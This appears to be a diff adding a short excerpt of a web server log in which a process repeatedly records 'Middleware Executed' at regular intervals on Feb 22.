+Feb 22 06:28:47 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:28:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:17 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:32 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:47 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:29:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:06 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:17 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:21 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:32 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:36 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:47 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:30:51 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:31:02 ip-172-31-40-166 web[2968]: Middleware Executed
+Feb 22 06:31:06 ip-172-31-40-166 web[2968]: Middleware Executed
+
+
